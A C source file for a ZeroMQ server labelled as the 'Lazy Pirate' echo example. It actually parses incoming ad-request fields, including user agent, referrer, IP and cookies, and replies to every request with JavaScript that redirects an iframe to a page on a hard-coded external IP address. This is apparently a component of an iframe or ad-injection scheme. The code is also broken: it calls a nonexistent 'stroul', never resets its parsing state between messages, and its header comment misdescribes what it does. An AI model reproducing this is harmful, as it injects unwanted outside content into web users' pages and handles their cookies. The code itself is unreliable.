
//  Lazy Pirate server
//  Binds REQ socket to tcp://*:5555
//  Like hwserver except:
//   - echoes request as-is
//   - randomly runs slowly, or exits to simulate a crash.

#include "zhelpers.h"
#include <unistd.h>


typedef enum
{
	ENUM_ZMQ_HOST = 0,
	ENUM_ZMQ_USER_AGENT,
	ENUM_ZMQ_COOKEIS,	
}enum_msg_t;


typedef struct
{
	int adtype;
	char useragent[1024];
	char refer[1024];
	char cookies[1024];
	uint32_t userip;
}apply_info_t;



int zmq_server_init (void)
{
    srandom ((unsigned) time (NULL));

    void *context = zmq_ctx_new ();
    void *server = zmq_socket (context, ZMQ_REP);
    zmq_bind (server, "tcp://*:5555");
	char buffer[2048];
	int size;
	char sendbuffer[2048];
    int cycles = 0;
	int l = 0;
	char *section = NULL;
	int section_offset = 0;
	apply_info_t  info;
	char *buf_ptr = buffer;

	
    while (1) {
		
		size=zmq_recv (server, buffer, 2000, 0);

		if(size == -1)
		{
			printf("zmq_recv Failed\n");
			break;;
		}
		
		buffer[size] = 0;		
		printf("recv len(%d) %s\n", size, buffer);
		
		while  (NULL != ( section = strsep(&buf_ptr, "@")))
		{
			switch(section_offset++)
			{
				case 0:
					info.adtype = atoi(section);
					break;
				case 1:
					strncpy(info.useragent ,(section), 1024);
					break;
				case 2:
					strncpy(info.refer,(section), 1024);
					break;
				case 3:
					info.userip = stroul(section, NULL ,0);
					break;
				case 4:
					strncpy(info.cookies,(section), 1024);
					break;
			}
		}
		printf("adtype = %d\n", info.adtype);
		printf("useragent = %s\n", info.useragent);
		printf("refer = %s\n", 		info.refer);
		printf("ip=%d\n", info.userip);
		printf("cookies = %s\n", info.cookies);
		
		l = snprintf(sendbuffer, 2048,
			"echo  \'document.getElementById(\"suspendcode15iframe\").src=\"http://219.234.83.60/locate_2/ddk_yanmai.pc.html\";\';"		
			);
		
		size= zmq_send(server, sendbuffer, l , 0);
		printf("send len(%d) %s\n", size, sendbuffer);
    }
    zmq_close (server);
    zmq_ctx_destroy (context);
    return 0;
}

